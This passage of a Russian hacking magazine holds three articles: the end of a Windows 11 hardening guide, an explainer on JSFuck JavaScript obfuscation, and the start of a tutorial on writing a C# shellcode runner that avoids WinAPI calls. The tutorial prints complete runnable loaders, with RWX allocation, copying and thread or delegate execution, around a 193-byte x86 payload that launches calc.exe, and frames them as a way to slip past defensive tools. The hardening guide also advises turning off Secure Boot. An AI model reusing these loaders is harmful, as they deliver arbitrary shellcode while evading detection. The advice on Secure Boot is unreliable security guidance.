конфигурации компьютера при установке Windows 11.





                   MSMG Toolkit

MSMG помогает и добавлять некоторые вещи: например, DirectX, Visual C++
Redistributable Runtimes и другие. Что круто: работа происходит на уровне
образа  установщика, на выходе будет файл  .iso, можно записать его
на флешку и устанавливать себе (или какому‑то счастливцу) уже прокачанную
версию Windows.


AutoSettings
AutoSettings — это скрипт с форума forum.ru-board.com, созданный поль‐
зователями westlife и LeX333666. Поскольку это просто сценарий PowerShell,
ты можешь прочесть его от начала и до конца, чтобы убедиться, что ничего
вредоносного в нем нет. Но полезного — просто масса. Если MSMG Toolkit
не осилил какие‑то настройки, то AutoSettings точно довершит дело.





                                 AutoSettings

Для скрипта есть пресеты, которые позволяют детально настроить то, что он
будет делать. Плюс есть интерфейс, в котором можно посмотреть, что вклю‐
чено или выключено в системе в данный момент.
   Если ты обратил внимание на скриншот, то заметил предупреждение, что
Windows 11 не поддерживается. Но на самом деле автор, похоже, просто
не исследовал все фичи последней версии Windows и некоторые новые нас‐
тройки пока не реализованы. Но те, что есть, прекрасно работают! Кроме
того, можно дорабатывать код скрипта и добавлять любые настройки самос‐
тоятельно.


ФАЙРВОЛ

Переходим к сетевой защите. Все знают, что в Windows есть встроенный фай‐
рвол. У многих к нему весьма предвзятое отношение, но он достаточно неп‐
лох, особенно если его правильно настроить.
  В сторонних файрволах присутствует HIPS (Host-based Intrusion Prevention
System) — система, которая защищает сам файрвол от воздействия других,
в том числе вредоносных, программ. В Windows тоже есть механизмы,
мониторящие целостность системных компонентов. Но все‑таки это не клас‐
сический HIPS, и это нужно понимать.


Сторонние файрволы
Почему бы не использовать сторонние файрволы? Здесь меня останавливает
все та же любимая паранойя. Ставишь в систему что‑то новое, и вот нужно
доверять еще одной компании.
  Ты можешь возразить, что есть опенсорсный Portmaster, за который можно
не переживать. Но заметил ли ты, что у него нет офлайнового установщика?
Сообщество давно ждет от разработчиков возможность ставить Portmaster
обычным инсталлятором, который не делал бы запросов к серверу, но такой
возможности до сих пор нет.
  Я нахожу это странным и пока не рискую использовать Portmaster. К тому
же у него есть проблемы с производительностью на быстрых каналах.



Что до дополнительной настройки стандартного файрвола, то тут нам при‐
годится тулза Malwarebytes Windows Firewall Control.





                       Windows Firewall Control

Это просто удобная панель управления встроенным файрволом Windows.
Как его настроить самому? Я в первую очередь наглухо запрещаю входящие
соединения. Затем удаляю все правила файрвола и включаю оповещения
на любое сетевое взаимодействие. Хочет программа или компонент ОС схо‐
дить в интернет? Windows Firewall Control скажет тебе от этом, а ты уже при‐
мешь решение. Если на твою машину попал стилер, то он как минимум
не сможет достучаться до управляющего сервера и передать награбленное
своим хозяевам.
  Из минусов утилиты — закрытый исходный код. Но если тебя одолевает
паранойя, то можешь установить Windows Firewall Control, сделать все нас‐
тройки, а затем удалить. Все созданные правила останутся в системе, если
ты откажешься от предложения вернуть всё как было.


НАСТРАИВАЕМ UEFI

Не стоит забывать про буткиты, а для борьбы с ними поможет небольшая нас‐
тройка UEFI. Вот что обязательно нужно сделать для его защиты.
   Во‑первых, регулярно обновлять UEFI. К сожалению, это узкое место
в безопасности устройства: в UEFI регулярно находят новые уязвимости,
а старые не всегда закрывают оперативно.
   Во‑вторых, рекомендую выключить Secure Boot. Это функция, которая
проверяет подпись загружаемых модулей EFI, чтобы убедиться, что они
не были изменены злоумышленником. Казалось бы, это должно повышать
безопасность, но на деле в самом этом механизме часто находят уязвимости.


ВСПОМОГАТЕЛЬНЫЙ СОФТ

Естественно, настройками одной ОС не обойтись, и нам все же понадобится
сторонний софт — безопасный либо обеспечивающий безопасность.


Librewolf
Браузер — критичное в плане безопасности и конфиденциальности приложе‐
ние. Его могут попытаться отслеживать,  атаковать через  эксплоит‑паки
и скрипты. Поэтому к выбору браузера и его плагинов нужно отнестись серь‐
езно.
  Мне в этом плане приглянулся форк Firefox под названием Librewolf. В нем
вырезан  код, отвечающий за  телеметрию,  централизованную  установку
обновлений и другие функции, которые могут повредить конфиденциальнос‐
ти. Но на него по‑прежнему можно устанавливать все плагины, доступные
в стандартном каталоге Firefox.
   Вот минимальный набор плагинов, которые я рекомендую установить
для того, чтобы сделать браузер более устойчивым к попыткам воздействия:
 • Noscript — для блокировки JavaScript;
 • uBlock Origin — блокирует рекламу, трекеры и вредоносные компоненты
   на сайтах;
 • Firefox Multi-Account Containers — позволяет запускать каждую вкладку
   в отдельном изолированном контейнере.

Все плагины опенсорсные, поэтому можно не беспокоиться, что твои данные
куда‑то утекут.
   Понимаю, что выбор браузера — тема извечного холивара. Если ты сто‐
ронник браузеров на Chromium, то найдутся варианты и для тебя, например
Ungoogled Chromium.


Sandboxie
Перед нами часто стоит дилемма: запустить новое приложение любопытства
ради или лучше все же не стоит — из соображений безопасности. Программа
Sandboxie избавляет от этого выбора. Она позволяет создавать изолирован‐
ные пространства для запуска потенциально уязвимых или опасных приложе‐
ний. Виртуализация производится на уровне фильтрующего драйвера, что
дает неплохую защиту, особенно если ты уже воспользовался рекомендаци‐
ей сидеть под учеткой юзера.
   Приложение платное, но есть и бесплатные возможности, которых может
вполне хватить. Код Sandboxie полностью открыт и доступен на GitHub.
   Такие вещи,  как  браузер и  читалка  PDF,  можно  всегда  запускать
в Sandboxie — на случай если в них все же найдется уязвимость, которую
не успел закрыть разработчик. И конечно, в Sandboxie стоит открывать неиз‐
вестные приложения и всякие подозрительные, но любопытные штуки, ска‐
чанные из темных уголков интернета.
  Еще лучше будет настроить самоочистку изолированной среды. Когда
открытые в ней программы завершатся, она может сбросить все изменения.
Этим ты еще и обеспечишь повышенную конфиденциальность: если, нап‐
ример, работать в таком режиме с браузером, то куки будут значительно
менее эффективным средством слежения за тобой.


Портативные версии приложений
Для  установки  приложений  часто  нужны  права  администратора, а это
повышает риск компрометации, особенно если ставить софт из неизвестных
источников. Минимизировать риск (но не исключить его полностью) можно,
используя портативные версии программ. Они не требуют установки, и, даже
если в них и будет заложена вредоносная функциональность, далеко в сис‐
теме вирус не продвинется. А правильно настроенный файрвол не даст утечь
твоим данным на сторону.


ESET Sysinspector
Это хороший монитор компонентов, установленных у тебя в системе. Чем
ESET Sysinspector  отличается от антивируса? Он не требует  установки,
не встраивается в систему и не находится постоянно в активном состоянии.
То есть модель работы с ним такова: запустил, проверил, нет ли в Windows
следов непрошеных гостей, и выключил.
   Это явно лучше, чем находиться под неусыпным мониторингом одного
из классических антивирусов. Кроме того, ESET Sysinspector не требует
для работы соединения с интернетом, так что никакие данные он не украдет.
Но есть и минус: исходный код приложения закрыт.


ВЫВОДЫ

Используя советы из этой статьи, ты сможешь неплохо обезопасить себя
от разнообразных атак. Для этого по большей части достаточно встроенных
возможностей Windows и  небольшого набора  опенсорсных  программ,
ни одна из которых не будет работать в системе непрерывно. И конечно, этот
подход можно и нужно развивать и дорабатывать в соответствии с твоими
нуждами и предпочтениями.
ВЗЛОМ





Давай отложим в сторону сухую техничес‐
кую прагматику и поговорим о прекрасном.
Ты спросишь: что может быть прекрасного
в обфускации кода? Я отвечу: некоторые
решения в этой области обладают пря‐           МВК
мо‑таки эстетически чарующей красотой,
доступной  только  истинным  ценителям.
Правда, называются порой не особенно
благозвучно.   Сегодня  мы   поговорим
о JSFuck — инструменте для обфускации
и деобфускации JavaScript.


На днях мне попалась на глаза статья про обфускацию и деобфускацию
апплетов JavaScript. Тема эта хоть и малоперспективная, но достаточно акту‐
альная: я и сам когда‑то касался ее в своем материале «Патчим JSXBIN.
Как править бинарные скрипты Adobe без перекомпиляции» применительно
к адобовской реализации JavaScript в ExtendScript Toolkit. Так вот, статья
напомнила мне про старенькое, но незаслуженно забытое решение в этой
области народного хозяйства под неприличным названием JSFuck.
  В «Хакере» это тоже пару раз упоминалось лет восемь назад примени‐
тельно к уязвимости eBay и обфусцированному коду.
   Справедливости ради надо заметить, что JSFuck тогда вспомнили исклю‐
чительно за хайповое название, поскольку хакеры для атаки на eBay поль‐
зовались самыми разнообразными обфускаторами и JSFuck там был отнюдь
не самым распространенным. Как‑то так получилось, что никто особо не опи‐
сывал принцип работы этого чудесного алгоритма, отсылая к авторскому
ресурсу jsfuck.com. В сегодняшней статье попробую хоть и поздно, но испра‐
вить данное упущение.
   Началось все с того, что в далеком 2009 году Ёсукэ Хасэгава (Yosuke
Hasegawa, не знаю, как этих японских любителей странного и специфичного
правильно называть  ;)) создал веб‑приложение jjencode, перекодирующее
любой код JavaScript в равноценную исполняемую форму, в которой исполь‐
зуется только 18 спецсимволов: []()!+,\"$.:;_{}~=.
  На первый взгляд подобное кажется чем‑то невероятным — процедурный
объектно ориентированный язык высокого уровня ужать до подмножества
из 18 спецсимволов, да еще и с сохранением всех исходных имен перемен‐
ных, классов, методов и так далее...
   Представь себе, например, программу на C, состоящую только из спец‐
символов, но при этом прекрасно компилирующуюся и корректно работа‐
ющую. Честно говоря, лично я, когда первый раз услышал про такое, тоже
сперва не поверил, думал, речь идет о какой‑то надстройке над интерпре‐
татором, шифрующей и перекодирующей исходный текст или даже под‐
компилирующей его в байт‑код. Как, например, было в моей статье про PHP
«В обход стражи. Отлаживаем код на PHP, упакованный SourceGuardian».
Или даже о кастомной реализации JS вроде адобовской.
   Однако нет, полученный текст, в котором отсутствуют буквы, цифры и куча
других символов, прекрасно и самодостаточно запускается, например, в бра‐
узерной строке. В этом легко убедиться самостоятельно, и это действитель‐
но выглядит каким‑то колдунством. Подробнее почитать об описанном явле‐
нии можно в статье, опубликованной на портале BusinessInfo, но мы не будем
углубляться в данную тему, поскольку, оказывается, и это не предел.
  В те времена эта идея настолько всех впечатлила, что буквально через
полгода на форуме обфускаторов sla.ckers.org был проведен конкурс,
цель которого — еще значительнее минимизировать подмножество исполь‐
зуемых символов. И действительно, это самое подмножество удалось сок‐
ратить более чем в два раза, до восьми символов: []()!+,/, а в мар‐
те 2010 года из него были исключены и символы ,/.
   Полученное минимальное подмножество из шести оставшихся символов
использовалось  в  онлайн‑кодировщике  JS-NoAlnum, на базе  которого
Хасэгава в конце этого же года создал кодировщик JSFuck. А чуть позже Мар‐
тин Клеппе (Martin Kleppe) опубликовал на гитхабе проект и сделал сайт
jsfuck.com с описанием алгоритма.
   Самые нетерпеливые читатели могут сразу перейти туда, чтобы озна‐
комиться с  алгоритмом,  так  сказать,  непосредственно из  первых  уст,
для остальных я продолжу свое повествование. Надо отдать должное Хасэга‐
ве: он так хулигански назвал свой проект не из каких‑то извращенных побуж‐
дений. Название происходит от Brainfuck (переводится как «вынос мозга»),
эзотерического языка программирования, на котором программы кодиру‐
ются схожим набором спецсимволов. Аллюзию добавляет и то, что предшес‐
твенник языка Brainfuck — эзотерический язык P'' тоже использует в своей
семантике шесть спецсимволов.
   Однако эти необычные языки программирования требовали для своего
исполнения компиляторы или интерпретаторы, написанные на других языках,
а JSFuck превосходно интерпретирует себя сам при помощи встроенного
интерпретатора браузерного движка JavaScript. Начнем же сеанс разоб‐
лачения черной магии.
   Первый вопрос, который приходит в голову при знакомстве с JSFuck, —
как он обходится без цифр и символов? Ведь при помощи его может быть
описана любая JavaScript-программа, в которой есть цифры и весь набор
латинских (и не только) символов вполне себе присутствует? Оказывается,
все просто: генерировать любой символ из шести исходных позволяет харак‐
терная особенность языка JavaScript — несколько экстравагантное преобра‐
зование типов при бинарных и унарных операциях. Она служит также источни‐
ком множества мемов и анекдотов про этот язык и программистов на нем.
   Начнем с  простого. Базовая  морфема,  описывающая  минимальное
выражение, сложенное из набора символов []()!+, — это [], означающее
пустой массив. При преобразовании его в Boolean (унарной операцией !) мы
получаем false, что по‑своему логично, ведь сам пустой массив истинен.
Соответственно, двойное отрицание !![] тоже будет истинно, причем
булева типа true.
   Преобразование пустого массива в число чуть менее логично: +[] дает
там 0, и уж совсем нелогично то, что сумма двух пустых массивов []+[] дает
пустую строку "". Оставим шутки над этим для составителей мемов, у нас
наметился прогресс — путем суммирования единиц мы получаем все числа,
путем суммирования с пустой строкой мы получаем преобразования числа (и
любого типа вообще) в строку и строки в число (путем унарной операции +).
Таким образом, нам, к примеру, не надо суммировать тысячу единиц, чтобы
получить 1000, — достаточно просуммировать ""+1+0+0+0 и преобразовать
результат обратно в число.
  Но как же теперь быть с символами? Символы можно получать, обращаясь
по индексу к строке. Пока что у нас таких строк всего две, они получены
при преобразовании в строку булевых выражений true и false. Чуть поднапряг‐
шись, можно получить строки NaN=+[0], undefined=[[]] (даже не спра‐
шивай меня, почему так ;)) и Infinity=+1e1000, но и это не шибко нас спа‐
сает.
  В итоге мы имеем довольно куцый набор символов: t, r, u, e, f, a,
l, s, I, f, i, n, y, N, d, u. Придется немного помухлевать. Исходя
из синтаксиса языка, к любому методу объекта можно обращаться как к
индексу массива, используя квадратные скобки. Поскольку [] — это Array,
соответственно, []["flat"] вернет нам метод  flat в виде объекта типа
Function, который при  переводе  в  строку  в  браузерной  реализации
JavaScript выглядит вот так.



На первый взгляд, большинство символов в ней у нас уже имеется, однако
добавление фигурных скобок, а также символов c и o заметно сдвинет нас
с мертвой точки. Из имеющихся в нашем распоряжении символов мы можем
составить замечательное слово constructor, которое дает нам доступ к конс‐
трукторам объектов различных типов:


[]["constructor"] - Array
""["constructor"] - String
0["constructor"] - Number
true["constructor"] - Boolean
[]["flat"]["constructor"] - Function
[]["flat"]["constructor"] - Object

Помимо множества ценных символов, нам открывается еще одна интересная
фича: использование конструктора Function позволяет напрямую вызывать
собранную строку, наподобие того, как это делает eval. Например, выраже‐
ние []["flat"]["constructor"]("alert(1)")() == Function("alert(1)
")() напрямую вызывает окно alert, исполняя код в кавычках.
   Другая интересная находка позволяет нам получить сразу все недос‐
тающие латинские символы нижнего регистра от a до z. Известно, что у конс‐
труктора Number существует метод toString(base), который преобразует
число в строку, используя систему счисления с базой base, причем base
как раз и ограничена количеством строчных латинских букв. Например:


"k"=(20)["toString"](21)
"v"=(31)["toString"](32)
...

Чтобы получить вообще все‑все‑все символы и окончательно закрыть тему,
нам неплохо бы иметь доступ к методу String.fromCharCode. И здесь мы
сталкиваемся с внезапной проблемой, возникшей буквально на ровном мес‐
те, — у нас до сих пор нет большой буквы С и совершенно неясно, как ее
получить. На удивление, ни одна возвращаемая строка не содержит эту букву.
Но хитрый извращенец Хасэгава обошел и это! В JavaScript имеется мало‐
известный и практически устаревший метод escape, преобразующий спец‐
символы в  строке в  соответствующие  шестнадцатеричные  escape-пос‐
ледовательности.  Например,  escape("<")="%3C",   третьим  символом
полученной строки мы и имеем недостающий нам С, который открывает
оставшиеся символы. Бинго!
   Теперь, когда вся магия разоблачена, я вкратце расскажу о достоинствах,
недостатках и возможностях использования этого диковинного инструмента
на практике.
   Как легко догадаться, главная проблема JSFuck в его чудовищной объ‐
емности. Я сам не проверял, но Вики утверждает, что для кодирования
некоторых символов требуется больше тысячи знаков, то есть этот код даже
сильно объемнее, чем если просто побитово закодировать каждый символ.
При том, как это ни парадоксально, упомянутый факт не влечет за собой
тысячекратного замедления работы кода, ведь его сборка — это пред‐
варительная разовая операция, после чего код исполняется с обычной ско‐
ростью.
  Из этого, кстати, вытекает и еще один, гораздо более существенный
минус этого способа обфускации. Ведь, несмотря на весь объем и отпугива‐
ющую запутанность кода, перед исполнением он собирается в исходный вид,
и на данном этапе его легко отследить. Например, рекомендуемые в хабров‐
ской статье ресурсы для обфускации достаточно легко обмануть, вставив
в выражение случайный терм, не входящий в подмножество JSFuck.





Однако встроенный интерпретатор JS не обманешь: как ни крути, на выходе
код будет в явном виде.





Конечно, это не означает, что обсуждаемый нами тип обфускации абсолютно
бесполезен  для  практического  применения. Если  отбросить фанатизм
и вместо того, чтобы перекодировать весь код в JSFuck, попутно раздувая
его в тысячу раз, технично перемешать рабочий (или обфусцированный
по‑другому) код кодированными выражениями, то можно сильно озадачить
потенциального реверсера, которому придется вытаскивать и декодировать
каждое обфусцированное выражение вручную, в то время как закодировать
программу можно и на автомате.
  Еще одно «достоинство» (впрочем, временное), которое использовали
в свое время хакеры в упомянутой выше атаке на eBay, — отсутствие алфа‐
витно‑цифровых символов, что некоторое время позволяло вредоносному
JSFuck-коду проходить фильтры контента.
   Гораздо более серьезная проблема этого алгоритма — его привязка
к реализации конкретного браузерного движка. Если ты внимательно следил
за описанной выше логикой получения отдельных символов, то мог заметить,
что, опираясь исключительно на стандарт языка, можно получить не более
пары десятков символов, а дальше приходится эксплуатировать недокумен‐
тированные особенности конкретно взятых браузеров. Ну, например, взятый
практически наугад символ q в современных реализациях браузеров уже
нельзя получить описанным в мануале способом:


("")["fontcolor"]([0]+false+")[20]

Все  потому,  что  ("")["fontcolor"]([0]+false+") —  это  <font
color="0false">font> и никакого символа q тут и близко нет, то есть этот
символ надо реализовывать описанным мною выше способом через метод
toString.
   Гораздо хуже дело обстоит с небраузерными реализациями JavaScript.
Например, в описанной мной ранее адобовской реализации ESTK алгоритм
JSFuck попросту невозможен в принципе, в этом легко убедиться самос‐
тоятельно.





Как видишь, символы круглых скобок не кодируются классическим способом,
а все потому, что в этой реализации почему‑то сократили стандартный метод
flat у объекта типа Array. Но даже это не самое плохое — жизненно важные
для реализации алгоритма символы c и o в адобовской версии JS стандар‐
тным способом получить нельзя, поскольку преобразование функции в строку
тут работает иначе.





Тем не менее выкрутиться можно и здесь: если добавить к минимальному
набору символов []()!+ два символа фигурных скобок {}, то получим объект
типа Object, который при переводе в строку выглядит как [object Object]
и дает нам искомые символы c и o. Данный алгоритм называется Hieroglyphy,
и подробно изучить его реализацию можно в соответствующей докумен‐
тации. Как видишь, поле деятельности для расширения функциональности
и  разработки  своих собственных реализаций JSFuck путем добавления
или замены базового набора символов весьма обширно. В завершение даже
подскажу одну идейку: добавление символа $ в адобовской реализации дает
объект типа Helper с набором своих методов и свойств.





В браузерной же реализации этот объект хоть и выглядит по‑другому, но тоже
весьма интересен.





Таким образом, каждый может самостоятельно реализовать свой собствен‐
ный уникальный обфускатор, добавив всего один символ к базовому набору.
КОДИНГ





Зачастую атакующие используют стандар‐
тные  функции  WinAPI  для  исполнения
шелл‑кода. Все эти методы давным‑давно
известны  любому  защитному  средству.
В статье мы отойдем от проторенного пути         MichelleVermishelle                                                                                       @Michaelzhm
и будем использовать иную парадигму —        michael.zhmailo@yandex.ru
полный отказ от использования WinAPI.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для специалистов по безопасности,
                          проводящих тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой вред,  причиненный с  применением
                          изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.


Что представляет собой стандартный шелл‑код‑раннер? В принципе, ничего
особенного в нем нет. Алгоритм прост как валенок:
 1. Сгенерировать, написать или где‑то позаимствовать нужный шелл‑код.
  Для этого часто используют готовые фреймворки вроде Metasploit.
 2. Выделить память под шелл‑код. Здесь чаще всего обращаются к функции
  VirtualAlloc()   или    низкоуровневым    аналогам,    например
  NtAllocateVirtualMemory() .
 3. Если на пункте 2 память была выделена без бита executable, то поставить
   этот    бит    на    память.    Тут    дергают   VirtualProtect()
   или NtProtectVirtualMemory() .
 4. Скопировать шелл‑код в память. В случае С++ программы обращаются
   к memcpy() , а в случае C# можно рассмотреть Marshal.Copy() .
 5. Передать поток управления по адресу шелл‑кода. Реализуется, например,
   через создание нового потока внутри CreateThread() .
 6. Успех!

Таким образом, стандартный шелл‑код‑раннер выглядит вот так.


using System;
using System.Runtime.InteropServices;
namespace ConsoleApp1
{
  class Program
  {
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling =
true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
uint
    flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint
dwStackSize,
    IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags,
IntPtr lpThreadId);
    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32
    dwMilliseconds);
    static void Main(string[] args)
    {
      byte[] x86shc = new byte[193] {
      0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,
0x8b,0x50,0x30,
      0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,
0x26,0x31,0xff,
      0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,
0xe2,0xf2,0x52,
      0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,
0x48,0x01,0xd1,
      0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,
0x8b,0x34,0x8b,
      0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,
0x75,0xf6,0x03,
      0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,
0xd3,0x66,0x8b,
      0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,
0x89,0x44,0x24,
      0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,
0x8b,0x12,0xeb,
      0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,
0x31,0x8b,0x6f,
      0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,
0x9d,0xff,0xd5,
      0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
0x72,0x6f,0x6a,
      0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,
0x00 };


      int size = x86shc.Length;
      IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
      Marshal.Copy(x86shc, 0, addr, size);
      IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero
, 0,
      IntPtr.Zero);
      WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
  }
}

Обрати внимание, что в конце идет вызов WaitForSingleObject(). Он здесь
не просто так. Наша программа делает self-injection (внедрение шелл‑кода
в адресное пространство текущего процесса). Запуск шелл‑кода происходит
в функции CreateThread(). Если бы после этой функции ничего не было, то
программа приостановила бы выполнение и завершилась. Как следствие,
наш шелл‑код перестанет выполняться.
   Поэтому вызов функции WaitForSingleObject() предотвращает преж‐
девременное закрытие программы. Наша основная программа будет пос‐
лушно ожидать успешного исполнения шелл‑кода.
   Итак, запускаем код и видим, что все стабильно работает.





        Успешное использование стандартного шелл‑код‑раннера

Теперь давай попробуем изменить программу так, чтобы избавиться от всех
функций WinAPI. В качестве шелл‑кода, как ты понял, используем стандар‐
тный запуск калькулятора. Архитектура — х86.


СИНХРОНИЗАЦИЯ ЧЕРЕЗ SLEEP

Начнем с самого простого — выбросим функцию WaitForSingleObject().
Ее последним аргументом было значение 0xFFFFFFFF, что равносильно кон‐
станте INFINITE в C++.





                       Значение константы INIFINITE

Поэтому нам достаточно взять и заменить вызов этой функции стандартным
Sleep(), ведь основная задача —  предотвратить выключение процесса
с запущенным шелл‑кодом.
   Предлагаю в качестве кандидата рассмотреть функцию Thread.Sleep().


public static void Sleep (int millisecondsTimeout);

В качестве millisecondsTimeout передаем, согласно документации, зна‐
чение Timeout.Infinite.


using System;
using System.Runtime.InteropServices;
using System.Threading;
namespace ConsoleApp1
{
  class Program
  {
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling =
true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
uint
    flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint
dwStackSize,
    IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags,
IntPtr lpThreadId);
    static void Main(string[] args)
    {
      byte[] x86shc = new byte[193] {
      0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,
0x8b,0x50,0x30,
      0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,
0x26,0x31,0xff,
      0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,
0xe2,0xf2,0x52,
      0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,
0x48,0x01,0xd1,
      0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,
0x8b,0x34,0x8b,
      0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,
0x75,0xf6,0x03,
      0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,
0xd3,0x66,0x8b,
      0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,
0x89,0x44,0x24,
      0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,
0x8b,0x12,0xeb,
      0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,
0x31,0x8b,0x6f,
      0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,
0x9d,0xff,0xd5,
      0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
0x72,0x6f,0x6a,
      0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,
0x00 };


      var size = x86shc.Length;
      var addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
      Marshal.Copy(x86shc, 0, addr, size);
      var hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0
, IntPtr.Zero);
      Thread.Sleep(Timeout.Infinite);
    }
  }
}

Запускаем, проверяем, все работает!





                       Успешная замена функции

Идем дальше — замена CreateThread().


                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ
             WINAPI  ЗАМЕНА ДЛЯ
          ПИШЕМ ШЕЛЛ-КОД-РАННЕР
                     НА ЧИСТОМ.NET





ПОТОК БЕЗ CREATETHREAD()

Здесь уже сложнее. Поток просто так не заменить. Впрочем, в C# есть
отдельный неймспейс System.Threading, который даст нам почти все необ‐
ходимые методы для работы с многопоточностью.
  Для выполнения шелл‑кода достаточно создать поток, а затем сделать
точку входа в него идентичной адресу шелл‑кода. Таким образом внутри
нового потока будет выполняться наша полезная нагрузка.
  Для запуска потока в C# нужно инициализировать экземпляр класса
Thread. Этот класс тоже  предоставляет некоторые методы для работы
с потоками:
 • статический метод GetDomain() возвращает ссылку на домен приложе‐
   ния;
 • статический метод GetDomainID() возвращает идентификатор домена
   приложения, в котором выполняется текущий поток;
 • статический метод Sleep()  останавливает  поток на  определенное
   количество миллисекунд;
 • метод Join() блокирует выполнение вызвавшего его потока до тех пор,
   пока не завершится поток, для которого был вызван этот метод;
 • метод Start() запускает поток.

В качестве точки входа потока, так же как и в С++, требуется указать опре‐
деленную функцию. Сразу засунуть сюда шелл‑код не получится — в С# имя
функции не является ее адресом. Поэтому потребуется создать дополнитель‐
ную функцию, которая будет принимать адрес шелл‑кода. А внутри этой так
называемой функции — точки входа потока запустить шелл‑код.


var size = x86shc.Length;
var addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
Marshal.Copy(x86shc, 0, addr, size);


Thread thread = new Thread(() => {
  IntPtr functionPtr = addr;
  ExecuteShellcode(functionPtr);
});


thread.Start();
thread.Join();

Запускать нужно внутри метода ExecuteShellcode(). Мы не используем
WinAPI, поэтому передавать поток управления по произвольному адресу
будем встроенными  средствами C#. На помощь нам  придут  делегаты.
Не пугайся, это только звучит страшно. По сути, это просто указатели на фун‐
кцию. Они позволяют передать поток управления по любому адресу.
  Код метода будет следующим.


static void ExecuteShellcode(IntPtr funcAddr)
{
  var func = Marshal.GetDelegateForFunctionPointer<FuncType>(funcAddr
);
  func();
}


[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
private delegate void FuncType();

Обрати внимание: в конце мы объявили делегат. Фактически это представ‐
ление нашего шелл‑кода. Он не принимает никаких аргументов и возвращает
void.
   Затем нужно создать новый делегат. У нас есть адрес, по которому рас‐
положен       шелл‑код,        поэтому        используем       метод
Marshal.GetDelegateForFunctionPointer() для инициализации делегата из адре‐
са в памяти.
   После успешной инициализации делегата передать ему поток управления
проще простого: нужно обратиться к делегату как к функции: func().
   Причем параллельно у нас получилось избавиться и от функции Sleep().
Она  была  успешно  заменена  вызовом  thread.Join().  Полный  код
с доработками — ниже.


using System;
using System.Runtime.InteropServices;
using System.Threading;


namespace ConsoleApp1
{
  class Program
  {
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling =
true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
uint flAllocationType, uint flProtect);


    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling =
true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
uint dwFreeType);


    static void Main(string[] args)
    {
      byte[] x86shc = new byte[193] {
        0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31,
0xc0, 0x64, 0x8b, 0x50, 0x30,
        0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f,
